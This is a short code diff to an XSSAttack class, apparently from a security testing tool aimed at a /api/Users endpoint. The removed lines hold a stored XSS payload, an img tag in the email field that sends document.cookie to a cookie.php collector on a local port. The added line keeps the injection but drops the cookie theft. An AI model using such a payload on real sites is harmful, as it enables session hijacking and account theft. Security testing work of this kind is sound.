@@ -176,9 +176,8 @@ class XSSAttack(Attack):
 
         url = self.base_url + "/api/Users"
 
-        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:" \
-                  "8081/cookie.php?c=\\\"+document.cookie>\", " \
-                  "\"password\": \"xss\"}"
+        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\"+ 100 >\", \"password\": \"xss\"}"
+
         headers = {
             'Content-Type': 'application/json'
         }
